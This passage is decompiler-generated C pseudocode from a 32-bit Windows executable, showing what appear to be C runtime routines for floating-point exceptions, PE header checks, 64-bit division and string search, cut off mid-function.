                            *v4 = (float64_t)((v3 & 0x4100) != 0 ? v23 : -v23);
                            if (v14 == 0) {
                                // 0x411103
                                v1 = a1 & 29;
                                goto lab_0x411106;
                            } else {
                                // 0x4110fb
                                function_40f9a4();
                                // 0x411103
                                v1 = a1 & 29;
                                goto lab_0x411106;
                            }
                        } else {
                            // 0x4110f6
                            *v4 = 0.0;
                            // 0x4110fb
                            function_40f9a4();
                            // 0x411103
                            v1 = a1 & 29;
                            goto lab_0x411106;
                        }
                    }
                }
            } else {
                // 0x410fa2
                function_40f9a4();
                int32_t v24 = 0x1000000 * a3 / 0x1000000 & 3072; // 0x410fb2
                switch (v24) {
                    case 0: {
                        // 0x41100a
                        v2 = INFINITY;
                        if ((llvm_ctpop_i8((char)(v3 / 256) & 5) & 1) == 0) {
                            // 0x411026
                            v2 = -INFINITY;
                            goto lab_0x411028;
                        } else {
                            goto lab_0x411028;
                        }
                    }
                    case 1024: {
                        // 0x410ff4
                        v2 = 1.7976931348623157e+308;
                        if ((llvm_ctpop_i8((char)(v3 / 256) & 5) & 1) == 0) {
                            // 0x411026
                            v2 = -INFINITY;
                            goto lab_0x411028;
                        } else {
                            goto lab_0x411028;
                        }
                    }
                    case 2048: {
                        // 0x410fde
                        v2 = INFINITY;
                        if ((llvm_ctpop_i8((char)(v3 / 256) & 5) & 1) != 0) {
                            goto lab_0x411028;
                        } else {
                            // 0x411026
                            v2 = -1.7976931348623157e+308;
                            goto lab_0x411028;
                        }
                    }
                    default: {
                        if (v24 != 3072) {
                            // 0x41102a
                            v1 = a1 & 30;
                            goto lab_0x411106;
                        } else {
                            // 0x410fc8
                            v2 = 1.7976931348623157e+308;
                            if ((llvm_ctpop_i8((char)(v3 / 256) & 5) & 1) != 0) {
                                goto lab_0x411028;
                            } else {
                                // 0x411026
                                v2 = -1.7976931348623157e+308;
                                goto lab_0x411028;
                            }
                        }
                    }
                }
            }
        } else {
            // 0x410f7f
            function_40f9a4();
            v1 = a1 & 27;
            goto lab_0x411106;
        }
    } else {
        // 0x410f66
        function_40f9a4();
        v1 = a1 & 23;
        goto lab_0x411106;
    }
  lab_0x411106:;
    int32_t v25 = v1; // 0x411109
    if ((a1 & 16) != 0 && (a3 & 32) != 0) {
        // 0x411111
        int32_t v26; // bp-28, 0x410f49
        *(int32_t *)((int32_t)&v26 - 4) = 32;
        function_40f9a4();
        v25 = v1 & 15;
    }
    // 0x41111c
    return v25 == 0;
  lab_0x411028:
    // 0x411028
    *(float64_t *)a2 = v2;
    // 0x41102a
    v1 = a1 & 30;
    goto lab_0x411106;
}

// Address range: 0x411129 - 0x41114c
int32_t function_411129(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6) {
    // 0x411129
    return function_41114c((int32_t *)a1, (int32_t *)a2, a3, a4, (int32_t *)a5, (int32_t *)a6, 0);
}

// Address range: 0x41114c - 0x41143d
int32_t function_41114c(int32_t * a1, int32_t * a2, int32_t a3, int32_t a4, int32_t * a5, int32_t * a6, int32_t a7) {
    int32_t lpArguments = (int32_t)a1;
    *(int32_t *)(lpArguments + 4) = 0;
    *(int32_t *)(lpArguments + 8) = 0;
    *(int32_t *)(lpArguments + 12) = 0;
    int32_t v1 = -0x3ffffff3; // 0x411175
    if ((a3 & 16) != 0) {
        int32_t * v2 = (int32_t *)(lpArguments + 4); // 0x41117f
        *v2 = *v2 | 1;
        v1 = -0x3fffff71;
    }
    int32_t v3 = v1; // 0x411185
    if ((a3 & 2) != 0) {
        int32_t * v4 = (int32_t *)(lpArguments + 4); // 0x41118f
        *v4 = *v4 | 2;
        v3 = -0x3fffff6d;
    }
    int32_t v5 = v3; // 0x411196
    if ((a3 & 1) != 0) {
        int32_t * v6 = (int32_t *)(lpArguments + 4); // 0x4111a0
        *v6 = *v6 | 4;
        v5 = -0x3fffff6f;
    }
    int32_t v7 = v5; // 0x4111a7
    if ((a3 & 4) != 0) {
        int32_t * v8 = (int32_t *)(lpArguments + 4); // 0x4111b1
        *v8 = *v8 | 8;
        v7 = -0x3fffff72;
    }
    int32_t dwExceptionCode = v7; // 0x4111b8
    if ((a3 & 8) != 0) {
        int32_t * v9 = (int32_t *)(lpArguments + 4); // 0x4111c2
        *v9 = *v9 | 16;
        dwExceptionCode = -0x3fffff70;
    }
    int32_t * v10 = (int32_t *)(lpArguments + 8); // 0x4111d4
    *v10 = (16 * *a2 & 16 | *v10 & -17) ^ 16;
    int32_t * v11 = (int32_t *)(lpArguments + 8); // 0x4111e6
    *v11 = (2 * *a2 & 8 | *v11 & -9) ^ 8;
    int32_t * v12 = (int32_t *)(lpArguments + 8); // 0x4111f8
    *v12 = (*a2 / 2 & 4 | *v12 & -5) ^ 4;
    int32_t * v13 = (int32_t *)(lpArguments + 8); // 0x41120b
    *v13 = (*a2 / 8 & 2 | *v13 & -3) ^ 2;
    int32_t * v14 = (int32_t *)(lpArguments + 8); // 0x41121e
    *v14 = (*v14 & -2 | *a2 / 32 & 1) ^ 1;
    int32_t v15; // 0x41114c
    int32_t v16; // 0x41114c
    int32_t v17; // 0x41114c
    int32_t v18; // 0x41114c
    int32_t v19 = function_40f9ff(v16, v15, v18, v17); // 0x411226
    if ((v19 & 1) != 0) {
        int32_t * v20 = (int32_t *)(lpArguments + 12); // 0x411235
        *v20 = *v20 | 16;
    }
    if ((v19 & 4) != 0) {
        int32_t * v21 = (int32_t *)(lpArguments + 12); // 0x411241
        *v21 = *v21 | 8;
    }
    if ((v19 & 8) != 0) {
        int32_t * v22 = (int32_t *)(lpArguments + 12); // 0x41124d
        *v22 = *v22 | 4;
    }
    if ((v19 & 16) != 0) {
        int32_t * v23 = (int32_t *)(lpArguments + 12); // 0x411259
        *v23 = *v23 | 2;
    }
    if ((v19 & 32) != 0) {
        int32_t * v24 = (int32_t *)(lpArguments + 12); // 0x411265
        *v24 = *v24 | 1;
    }
    int32_t v25 = *a2 & 3072; // 0x41126f
    int32_t * v26; // 0x41114c
    int32_t v27; // 0x41114c
    switch (v25) {
        case 0: {
            int32_t * v28 = (int32_t *)lpArguments; // 0x4112ab
            *v28 = *v28 & -4;
            goto lab_0x4112ae;
        }
        case 1024: {
            int32_t * v29 = (int32_t *)lpArguments;
            v26 = v29;
            v27 = *v29 & -4 | 1;
            goto lab_0x411298;
        }
        case 2048: {
            int32_t * v30 = (int32_t *)lpArguments;
            v26 = v30;
            v27 = *v30 & -4 | 2;
            goto lab_0x411298;
        }
        default: {
            if (v25 == 3072) {
                int32_t * v31 = (int32_t *)lpArguments; // 0x411288
                *v31 = *v31 | 3;
            }
            goto lab_0x4112ae;
        }
    }
  lab_0x4112ae:;
    int32_t v32 = *a2 & 768; // 0x4112b5
    int32_t * v33; // 0x41114c
    int32_t v34; // 0x41114c
    switch (v32) {
        case 0: {
            int32_t * v35 = (int32_t *)lpArguments;
            v33 = v35;
            v34 = *v35 & -29 | 8;
            goto lab_0x4112e4;
        }
        case 512: {
            int32_t * v36 = (int32_t *)lpArguments;
            v33 = v36;
            v34 = *v36 & -29 | 4;
            goto lab_0x4112e4;
        }
        default: {
            if (v32 == 768) {
                int32_t * v37 = (int32_t *)lpArguments; // 0x4112c7
                *v37 = *v37 & -29;
            }
            goto lab_0x4112e6;
        }
    }
  lab_0x411298:
    // 0x411298
    *v26 = v27;
    goto lab_0x4112ae;
  lab_0x4112e6:;
    int32_t * v38 = (int32_t *)lpArguments; // 0x4112ef
    *v38 = *v38 & -0x1ffe1 | 32 * a4 & 0x1ffe0;
    int32_t * v39 = (int32_t *)(lpArguments + 32); // 0x4112fc
    *v39 = *v39 | 1;
    int32_t * v40 = (int32_t *)(lpArguments + 32);
    int32_t v41 = *v40 & -31;
    if (a7 == 0) {
        // 0x411331
        *v40 = v41 | 2;
        *(float64_t *)(lpArguments + 16) = *(float64_t *)a5;
        int32_t * v42 = (int32_t *)(lpArguments + 96); // 0x41134e
        *v42 = *v42 | 1;
        int32_t * v43 = (int32_t *)(lpArguments + 96); // 0x411357
        *v43 = *v43 & -31 | 2;
        *(float64_t *)(lpArguments + 80) = *(float64_t *)a6;
    } else {
        // 0x411305
        *v40 = v41;
        *(int32_t *)(lpArguments + 16) = *a5;
        int32_t * v44 = (int32_t *)(lpArguments + 96); // 0x41131a
        *v44 = *v44 | 1;
        int32_t * v45 = (int32_t *)(lpArguments + 96); // 0x411323
        *v45 = *v45 & -31;
        *(int32_t *)(lpArguments + 80) = *a6;
    }
    // 0x41136b
    function_40f965();
    RaiseException(dwExceptionCode, 0, 1, &lpArguments);
    char * v46 = (char *)(lpArguments + 8); // 0x411382
    char v47 = *v46; // 0x411382
    char v48 = v47; // 0x411386
    if ((v47 & 16) != 0) {
        // 0x411388
        *a2 = *a2 & -2;
        v48 = *v46;
    }
    char v49 = v48; // 0x41138f
    if ((v48 & 8) != 0) {
        // 0x411391
        *a2 = *a2 & -5;
        v49 = *v46;
    }
    char v50 = v49; // 0x411398
    if ((v49 & 4) != 0) {
        // 0x41139a
        *a2 = *a2 & -9;
        v50 = *v46;
    }
    char v51 = v50; // 0x4113a1
    if ((v50 & 2) != 0) {
        // 0x4113a3
        *a2 = *a2 & -17;
        v51 = *v46;
    }
    // 0x4113a6
    if ((v51 & 1) != 0) {
        // 0x4113ac
        *a2 = *a2 & -33;
    }
    int32_t * v52 = (int32_t *)lpArguments; // 0x4113af
    int32_t v53 = *v52 & 3; // 0x4113b6
    int32_t v54; // 0x41114c
    int32_t v55; // 0x41114c
    switch (v53) {
        case 0: {
            int32_t v56 = *a2 & -3073; // 0x4113f3
            *a2 = v56;
            v54 = v56;
            goto lab_0x4113f5;
        }
        case 1: {
            // 0x4113e5
            v55 = *a2 & -3073 | 1024;
            goto lab_0x4113e1;
        }
        default: {
            int32_t v57 = *a2;
            if (v53 == 2) {
                // 0x4113d5
                v55 = v57 & -3073 | 2048;
                goto lab_0x4113e1;
            } else {
                int32_t v58 = v57 | 3072; // 0x4113cd
                *a2 = v58;
                v54 = v58;
                goto lab_0x4113f5;
            }
        }
    }
  lab_0x4112e4:
    // 0x4112e4
    *v33 = v34;
    goto lab_0x4112e6;
  lab_0x4113f5:;
    int32_t v59 = *v52 / 4 & 7; // 0x4113fa
    int32_t result; // 0x41114c
    int32_t v60; // 0x41114c
    switch (v59) {
        case 0: {
            // 0x41141b
            v60 = v54 & -3841 | 768;
            goto lab_0x411424;
        }
        case 1: {
            // 0x411410
            v60 = v54 & -3585 | 512;
            goto lab_0x411424;
        }
        default: {
            int32_t v61 = v59 - 2; // 0x411407
            result = v61;
            if (v61 == 0) {
                // 0x41140c
                *a2 = v54 & -3073;
                result = v61;
            }
            goto lab_0x411426;
        }
    }
  lab_0x4113e1:
    // 0x4113e1
    *a2 = v55;
    v54 = v55;
    goto lab_0x4113f5;
  lab_0x411426:
    // 0x411426
    if (a7 == 0) {
        // 0x411434
        int32_t v62; // 0x41114c
        float64_t v63 = *(float64_t *)v62; // 0x411434
        *(float64_t *)a6 = v63;
    } else {
        // 0x41142d
        *a6 = *(int32_t *)(lpArguments + 80);
    }
    // 0x411439
    return result;
  lab_0x411424:
    // 0x411424
    *a2 = v60;
    result = v60;
    goto lab_0x411426;
}

// Address range: 0x41143d - 0x41146c
int32_t function_41143d(int32_t a1) {
    if (a1 == 1) {
        int32_t result = function_40b091(); // 0x41145f
        *(int32_t *)result = 33;
        // 0x41146a
        return result;
    }
    int32_t result3 = a1 - 2; // 0x41144a
    if (a1 == 3 || result3 == 0) {
        int32_t result2 = function_40b091(); // 0x411452
        *(int32_t *)result2 = 34;
        return result2;
    }
    // 0x41146a
    return result3;
}

// Address range: 0x41146c - 0x41150e
int32_t function_41146c(int32_t a1, int32_t a2, float80_t a3, float80_t a4, float80_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9) {
    int32_t v1 = 0; // 0x411479
    int32_t v2 = 8 * v1; // 0x41147b
    while (*(int32_t *)(v2 + (int32_t)&g69) != a2) {
        // 0x411484
        v1++;
        if (v1 >= 29) {
            // 0x4114ef
            function_40f978();
            return function_41143d(a1);
        }
        v2 = 8 * v1;
    }
    // 0x41148c
    function_40f978();
    if (*(int32_t *)(v2 + (int32_t)&g70) == 0) {
      lab_0x4114ef_2:
        // 0x41150a
        return function_41143d(a1);
    }
    int32_t v3 = function_40ab88(); // 0x4114d6
    int32_t result = v3; // 0x4114e0
    if (v3 == 0) {
        // 0x4114e2
        result = function_41143d(a1);
    }
    // 0x41150a
    return result;
}

// Address range: 0x41150e - 0x4115e2
int32_t function_41150e(float80_t a1, int32_t a2, int32_t * a3, int32_t result, int32_t a5, int32_t a6) {
    // 0x41150e
    uint32_t v1; // 0x41150e
    if ((llvm_ctpop_i8((char)(v1 / 256) & 68) & 1) != 0) {
        // 0x4115da
        *(int32_t *)result = 0;
        return result;
    }
    uint32_t v2 = (int32_t)a3;
    int32_t v3; // 0x41150e
    if ((v2 & 0x7ff0) == 0) {
        // 0x41153a
        v3 = a2;
        if ((a2 & 0xfffff || (int32_t)(float32_t)a1) != 0) {
            int32_t v4 = (float32_t)a1; // 0x411565
            int32_t v5 = -1021; // 0x411565
            if ((v2 & 16) == 0) {
                int32_t v6 = 2 * (int32_t)(float32_t)a1; // 0x411576
                int32_t v7 = -1022; // 0x411578
                int32_t v8 = v6; // 0x41157d
                int32_t v9 = v7; // 0x41157d
                while ((v2 & 16) == 0) {
                    // 0x411567
                    v6 = 2 * v8;
                    v7 = v9 - 1;
                    v8 = v6;
                    v9 = v7;
                }
                // 0x41157f
                v4 = (float32_t)(float64_t)(int64_t)v6;
                v5 = v7;
            }
            // 0x411586
            function_4115e2((float80_t)(int80_t)v4, 0xffef, 0);
            // 0x4115da
            *(int32_t *)result = v5;
            return result;
        }
    }
    // 0x4115b6
    function_4115e2(a1, v3, 0);
    // 0x4115da
    *(int32_t *)result = (v2 / 16 & 2047) - 1022;
    return result;
}

// Address range: 0x4115e2 - 0x411611
float80_t function_4115e2(float80_t result, int32_t a2, int32_t a3) {
    // 0x4115e2
    return result;
}

// Address range: 0x411611 - 0x41166f
int32_t function_411611(float80_t a1, int32_t a2, int32_t a3) {
    if (a2 != 0x7ff00000) {
        // 0x411629
        if (a2 == -0x100000 == (int32_t)(float32_t)a1 == 0) {
            // 0x411638
            return 2;
        }
    } else {
        if ((int32_t)(float32_t)a1 == 0) {
            // 0x411626
            return (int32_t)(float32_t)a1 + 1;
        }
    }
    int32_t v1 = a3 & 0x7ff8; // 0x411644
    if (v1 == 0x7ff8) {
        // 0x411638
        return 3;
    }
    if (v1 != 0x7ff0) {
        // 0x411638
        return 0;
    }
    // 0x41165a
    if ((a2 & 0x7ffff || (int32_t)(float32_t)a1) != 0) {
        // 0x411638
        return 4;
    }
    // 0x411638
    return 0;
}

// Address range: 0x41166f - 0x411713
int32_t function_41166f(float80_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    int32_t v1 = a3 & 0x7ff0; // 0x411680
    if (v1 == 0x7ff0) {
        int32_t result = 512; // 0x41166f
        int32_t v2 = 4; // 0x41166f
        int32_t v3; // 0x41166f
        int32_t v4; // 0x41166f
        switch (function_411611(a1, v4 & -0x10000 || a3 & 0xffff, v3)) {
            case 3: {
                // 0x4116b1
                v2 = 2;
            }
            case 2: {
                // 0x4116b1
                result = v2;
            }
            case 1: {
                // 0x4116a6
                return result;
            }
            default: {
                // 0x4116a6
                result = 1;
                return result;
            }
        }
    }
    int32_t v5 = a3 & 0x8000; // 0x4116be
    if (v1 == 0) {
        if ((a2 & 0xfffff) != 0) {
            // 0x4116d8
            return v5 == 0 ? 128 : 16;
        }
        if ((int32_t)(float32_t)a1 != 0) {
            // 0x4116d8
            return v5 == 0 ? 128 : 16;
        }
    }
    // 0x4116e7
    uint32_t v6; // 0x41166f
    if ((llvm_ctpop_i8((char)(v6 / 256) & 68) & 1) == 0) {
        // 0x411701
        return v5 == 0 ? 256 : 8;
    }
    // 0x4116f5
    return v5 == 0 ? 64 : 32;
}

// Address range: 0x411713 - 0x411719
bool function_411713(int32_t ProcessorFeature) {
    // 0x411713
    return IsProcessorFeaturePresent(ProcessorFeature);
}

// Address range: 0x411720 - 0x411763
int32_t function_411720(int32_t a1, uint32_t a2) {
    int32_t v1 = *(int32_t *)(a1 + 60) + a1; // 0x41172e
    uint16_t v2 = *(int16_t *)(v1 + 6); // 0x411734
    if (v2 == 0) {
        // 0x41175e
        return 0;
    }
    int32_t v3 = 0; // 0x411741
    int32_t v4 = v1 + 24 + (int32_t)*(int16_t *)(v1 + 20);
    uint32_t v5 = *(int32_t *)(v4 + 12); // 0x411744
    if (v5 <= a2) {
        // 0x41174b
        if (*(int32_t *)(v4 + 8) + v5 > a2) {
            // break -> 0x41175e
            break;
        }
    }
    // 0x411754
    v3++;
    int32_t v6 = v4 + 40; // 0x41175a
    int32_t result = 0; // 0x41175a
    while (v3 < (int32_t)v2) {
        // 0x411744
        v4 = v6;
        v5 = *(int32_t *)(v4 + 12);
        if (v5 <= a2) {
            // 0x41174b
            result = v4;
            if (*(int32_t *)(v4 + 8) + v5 > a2) {
                // break -> 0x41175e
                break;
            }
        }
        // 0x411754
        v3++;
        v6 = v4 + 40;
        result = 0;
    }
    // 0x41175e
    return result;
}

// Address range: 0x411770 - 0x41182a
int32_t function_411770(int32_t * a1) {
    int32_t v1 = __readfsdword(0); // bp-20, 0x411785
    __writefsdword(0, (int32_t)&v1);
    if (function_411830(0x400000) == 0) {
        // 0x41180f
        __writefsdword(0, v1);
        return 0;
    }
    int32_t v2 = function_411720(0x400000, (int32_t)a1 - 0x400000); // 0x4117c9
    if (v2 == 0) {
        // 0x41180f
        __writefsdword(0, v1);
        return 0;
    }
    // 0x4117d5
    __writefsdword(0, v1);
    return *(int32_t *)(v2 + 36) > -1;
}

// Address range: 0x411830 - 0x411863
int32_t function_411830(int32_t a1) {
    // 0x411830
    if (*(int16_t *)a1 != 0x5a4d) {
        // 0x411858
        return 0;
    }
    int32_t v1 = *(int32_t *)(a1 + 60) + a1; // 0x411843
    if (*(int32_t *)v1 != 0x4550) {
        // 0x411858
        return 0;
    }
    // 0x41184d
    if (*(int16_t *)(v1 + 24) == 267) {
        // 0x411858
        return 1;
    }
    // 0x411858
    return 0;
}

// Address range: 0x411863 - 0x41189a
int32_t function_411863(int32_t a1, int32_t a2) {
    int32_t v1 = __readfsdword(0); // bp-8, 0x411864
    int32_t result = &v1; // 0x411864
    int32_t v2 = result - a2; // 0x41186f
    int32_t v3; // 0x411863
    *(int32_t *)(v2 - 16) = g112 ^ (int32_t)&v3;
    *(int32_t *)(v2 - 20) = a1;
    __writefsdword(0, result);
    return result;
}

// Address range: 0x4118a0 - 0x411935
int32_t function_4118a0(uint32_t a1, uint32_t a2, uint32_t a3, int32_t a4) {
    int32_t v1 = a1; // 0x4118a7
    uint32_t v2 = a4; // 0x4118a7
    int32_t v3 = a3; // 0x4118a7
    if (a4 == 0) {
        int32_t result = (0x100000000 * (int64_t)(a2 % a3) | (int64_t)a1) / (int64_t)a3; // 0x4118cf
        // 0x411918
        return result;
    }
    v3 = 0x80000000 * (int32_t)((v2 & 1) != 0) | v3 / 2;
    uint32_t v4 = a2 / 2; // 0x4118e3
    v1 = 0x80000000 * (int32_t)((a2 & 1) != 0) | v1 / 2;
    while (v2 >= 2) {
        // 0x4118df
        v2 /= 2;
        uint32_t v5 = v4;
        v3 = 0x80000000 * (int32_t)((v2 & 1) != 0) | v3 / 2;
        v4 = v5 / 2;
        v1 = 0x80000000 * (int32_t)((v5 & 1) != 0) | v1 / 2;
    }
    uint64_t v6 = (0x100000000 * (int64_t)v4 | (int64_t)v1) / (int64_t)v3; // 0x4118eb
    int32_t result2 = v6; // 0x4118eb
    uint64_t v7 = (v6 & 0xffffffff) * (int64_t)a3; // 0x4118f9
    uint32_t v8 = (int32_t)(v7 / 0x100000000); // 0x4118f9
    uint32_t v9 = result2 * a4 + v8; // 0x4118fb
    if (v9 < v8 || v9 > a2 || (int32_t)v7 > a1 == v9 >= a2) {
        // 0x411918
        return result2 - 1;
    }
    // 0x411918
    return result2;
}

// Address range: 0x411940 - 0x411989
int32_t function_411940(int32_t * a1, int32_t a2, int32_t a3) {
    int32_t v1 = __readfsdword(0); // bp-8, 0x411945
    int32_t result = &v1; // 0x411945
    int32_t v2 = result - a3; // 0x411958
    int32_t v3; // 0x411940
    *(int32_t *)(v2 - 16) = g112 ^ (int32_t)&v3;
    *(int32_t *)(v2 - 20) = (int32_t)a1;
    __writefsdword(0, result);
    return result;
}

// Address range: 0x411989 - 0x41199a
int32_t function_411989(void) {
    // 0x411989
    function_406b2c();
    int32_t result = function_406d36((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x411994
    return result;
}

// Address range: 0x4119a0 - 0x4119d4
int32_t function_4119a0(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x4119a0
    return a3 * a1;
}

// Address range: 0x4119e0 - 0x411a0d
int32_t function_4119e0(int32_t result) {
    int32_t v1 = result;
    uint32_t v2 = (int32_t)&v1; // 0x4119e1
    uint32_t v3; // 0x4119e0
    uint32_t v4 = (v3 > v2 ? v3 : v2) - v3;
    int32_t v5; // bp-4096, 0x4119e0
    for (uint32_t i = (int32_t)&v5; i >= v4; i -= 0x1000) {
        // continue -> 0x4119f4
    }
    // 0x4119f9
    *(int32_t *)v4 = result;
    return result;
}

// Address range: 0x411a10 - 0x411aef
int32_t function_411a10(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    int32_t v1 = a2; // 0x411a1d
    int32_t v2 = a1; // 0x411a1d
    int32_t v3 = 0; // 0x411a1d
    if (a2 < 0) {
        // 0x411a1f
        v1 = (int32_t)(a1 != 0) - a2;
        v2 = -a1;
        v3 = 1;
    }
    int32_t v4 = a4; // 0x411a3a
    int32_t v5 = a3; // 0x411a3a
    int32_t v6 = v3; // 0x411a3a
    if (a4 < 0) {
        // 0x411a3c
        v4 = (int32_t)(a3 != 0) - a4;
        v5 = -a3;
        v6 = v3 + 1;
    }
    uint32_t v7 = v5;
    int32_t v8 = v2; // 0x411a52
    int32_t v9 = v7; // 0x411a52
    uint32_t v10 = v4; // 0x411a52
    int32_t v11; // 0x411a10
    if (v4 == 0) {
        int32_t v12 = (0x100000000 * (int64_t)(v1 % v7) | (int64_t)v2) / (int64_t)v7; // 0x411a7a
        // 0x411ac3
        v11 = v12;
        return v6 != 1 ? v11 : -v11;
    }
    v9 = 0x80000000 * (int32_t)((v10 & 1) != 0) | v9 / 2;
    uint32_t v13 = v1 / 2; // 0x411a8e
    v8 = 0x80000000 * (int32_t)((v1 & 1) != 0) | v8 / 2;
    while (v10 >= 2) {
        // 0x411a8a
        v10 /= 2;
        uint32_t v14 = v13;
        v9 = 0x80000000 * (int32_t)((v10 & 1) != 0) | v9 / 2;
        v13 = v14 / 2;
        v8 = 0x80000000 * (int32_t)((v14 & 1) != 0) | v8 / 2;
    }
    uint64_t v15 = (0x100000000 * (int64_t)v13 | (int64_t)v8) / (int64_t)v9; // 0x411a96
    int32_t v16 = v15; // 0x411a96
    uint64_t v17 = (v15 & 0xffffffff) * (int64_t)v7; // 0x411aa4
    uint32_t v18 = (int32_t)(v17 / 0x100000000); // 0x411aa4
    uint32_t v19 = v4 * v16 + v18; // 0x411aa6
    if (v19 < v18 || v19 > v1 || v2 < (int32_t)v17 == v19 >= v1) {
        // 0x411ac3
        v11 = v16 - 1;
        return v6 != 1 ? v11 : -v11;
    }
    // 0x411ac3
    v11 = v16;
    return v6 != 1 ? v11 : -v11;
}

// Address range: 0x411af0 - 0x411b0f
int32_t function_411af0(void) {
    // 0x411af0
    int32_t v1; // 0x411af0
    unsigned char v2 = (char)v1; // 0x411af0
    int32_t result = 0; // 0x411af3
    if (v2 >= 64) {
        // 0x411b0a
        return result;
    }
    uint32_t v3 = v1 & 31;
    uint32_t v4; // 0x411af0
    if (v2 >= 32) {
        // 0x411b0a
        return v4 >> v3;
    }
    if (v3 != 0) {
        uint32_t v5; // 0x411af0
        result = v4 << 32 - v3 | v5 >> v3;
    }
    // 0x411b0a
    return result;
}

// Address range: 0x411b10 - 0x411b26
int32_t function_411b10(void) {
    // 0x411b10
    return function_4119e0((int32_t)&g266);
}

// Address range: 0x411b26 - 0x411b3c
int32_t function_411b26(void) {
    // 0x411b26
    return function_4119e0((int32_t)&g266);
}

// Address range: 0x411b40 - 0x411b5f
int32_t function_411b40(void) {
    // 0x411b40
    int32_t v1; // 0x411b40
    if ((unsigned char)(char)v1 < 32) {
        // 0x411b4a
        int32_t v2; // 0x411b40
        return v2 << (uint32_t)(v1 & 31);
    }
    // 0x411b50
    return 0;
}

// Address range: 0x411b60 - 0x411c15
int32_t function_411b60(void) {
    // 0x411b60
    float80_t v1; // 0x411b60
    float32_t v2 = v1;
    if (g162 != 0) {
        // 0x411b69
        return __asm_cvttsd2si((int64_t)(int32_t)v2);
    }
    int32_t v3 = v1; // 0x411bbb
    if (v3 == 0) {
        // 0x411bff
        int32_t v4; // 0x411b60
        if ((v4 & 0x7fffffff) == 0) {
            // 0x411c13
            return 0;
        }
    }
    // 0x411bc3
    int32_t result; // 0x411b60
    if ((int32_t)v2 >= 0) {
        // 0x411be7
        result = v3 - (int32_t)((int32_t)(float32_t)0.0 > 0x80000000);
    } else {
        // 0x411bc9
        result = (int32_t)((int32_t)(float32_t)0.0 - 1 < ((int32_t)(float32_t)0.0 ^ -0x80000000)) + v3;
    }
    // 0x411c13
    return result;
}

// Address range: 0x411c20 - 0x411d57
int32_t function_411c20(int32_t a1, unsigned char a2) {
    // 0x411c20
    if (g162 == 0) {
        int32_t v1 = -1; // 0x411d36
        int32_t v2 = a1;
        int32_t v3 = 0; // 0x411d36
        int32_t v4 = v2; // 0x411d36
        while (v1 != 0) {
            // 0x411d2e
            bool v5; // 0x411c20
            int32_t v6 = v2 + (v5 ? -1 : 1); // 0x411d36
            v1--;
            v3 = v1;
            v4 = v6;
            if (*(char *)v2 == 0) {
                // break ->
                break;
            }
            v2 = v6;
            v3 = 0;
            v4 = v2;
        }
        int32_t v7 = v3 ^ -1; // 0x411d44
        int32_t v8 = v4 - 1;
        int32_t v9 = v8; // 0x411d44
        while (v7 != 0) {
            int32_t v10 = v8 - 1; // 0x411d44
            v7--;
            v9 = v10;
            if (*(char *)v8 == a2) {
                // break -> 0x411d53
                break;
            }
            v8 = v10;
            v9 = v8;
        }
        int32_t v11 = v9 + 1; // 0x411d46
        return *(char *)v11 == a2 ? v11 : 0;
    }
    int32_t v12 = a2;
    if (g162 == 1) {
        int128_t v13 = __asm_pshuflw(__asm_movd(256 * v12 | v12), 0); // 0x411c45
        int128_t v14 = __asm_movlhps(v13, v13); // 0x411c4a
        uint32_t v15 = a1 & 15; // 0x411c52
        int32_t v16 = -1 << v15; // 0x411c5b
        int32_t v17 = a1 - v15;
        int32_t v18 = 0;
        int128_t v19; // 0x411c20
        int128_t v20 = v19;
        int128_t v21 = __asm_movdqu_6(*(int128_t *)v17); // 0x411c5d
        int128_t v22 = __asm_pcmpeqb(__asm_pxor(v20, v20), v21); // 0x411c65
        int128_t v23 = __asm_pcmpeqb(v21, v14); // 0x411c69
        int32_t v24 = __asm_pmovmskb(v22) & v16; // 0x411c71
        int32_t v25 = __asm_pmovmskb(v23) & v16;
        while (v24 == 0) {
            int32_t v26 = v25 == 0 ? v16 : llvm_ctlz_i32(v25, true) ^ 31; // 0x411c7b
            int32_t v27 = v25 != 0 ? v26 + v17 : v18; // 0x411c82
            v16 = -1;
            v17 += 16;
            v18 = v27;
            v20 = v22;
            v21 = __asm_movdqu_6(*(int128_t *)v17);
            v22 = __asm_pcmpeqb(__asm_pxor(v20, v20), v21);
            v23 = __asm_pcmpeqb(v21, v14);
            v24 = __asm_pmovmskb(v22) & v16;
            v25 = __asm_pmovmskb(v23) & v16;
        }
        int32_t v28 = 2 * v24; // 0x411c94
        int32_t v29 = (v28 & -v28) - 1 & v25; // 0x411c9d
        return v29 == 0 ? v18 : (llvm_ctlz_i32(v29, true) ^ 31) + v17;
    }
    if (a2 == 0) {
        int32_t v30 = a1 & -16; // 0x411cf3
        int128_t v31; // 0x411c20
        int128_t v32 = __asm_pcmpeqb(__asm_pxor(v31, v31), *(int128_t *)v30); // 0x411cf9
        int32_t v33 = -1 << (a1 & 15);
        int32_t v34 = __asm_pmovmskb(v32) & v33; // 0x411d0f
        int32_t v35 = v30; // 0x411d11
        int32_t v36 = v34; // 0x411d11
        if (v34 == 0) {
            int128_t v37 = v32;
            int128_t v38 = __asm_pxor(v37, v37); // 0x411d13
            int32_t v39 = v30 + 16; // 0x411d17
            int128_t v40 = __asm_pcmpeqb(v38, *(int128_t *)v39); // 0x411d17
            int32_t v41 = __asm_pmovmskb(v40); // 0x411d1f
            int32_t v42 = v39; // 0x411d25
            v35 = v39;
            v36 = v41;
            while (v41 == 0) {
                // 0x411d13
                v37 = v40;
                v38 = __asm_pxor(v37, v37);
                v39 = v42 + 16;
                v40 = __asm_pcmpeqb(v38, *(int128_t *)v39);
                v41 = __asm_pmovmskb(v40);
                v42 = v39;
                v35 = v39;
                v36 = v41;
            }
        }
        int32_t v43 = v36;
        // 0x411ceb
        return (v43 == 0 ? v33 : llvm_cttz_i32(v43, true)) + v35;
    }
    int32_t result2 = 0; // 0x411cbd
    int32_t v44 = a1; // 0x411cbd
    int32_t result = 0; // 0x411cbd
    int32_t v45 = a1; // 0x411cbd
    if ((a1 & 15) == 0) {
      lab_0x411cd4:;
        int128_t v46 = __asm_movd(v12); // 0x411cd4
        int32_t v47 = v45 + 16; // 0x411cd8
        __asm_pcmpistri(v46, *(int128_t *)v45, 64);
        int32_t v48 = v47; // 0x411ce9
        while (v47 != 0) {
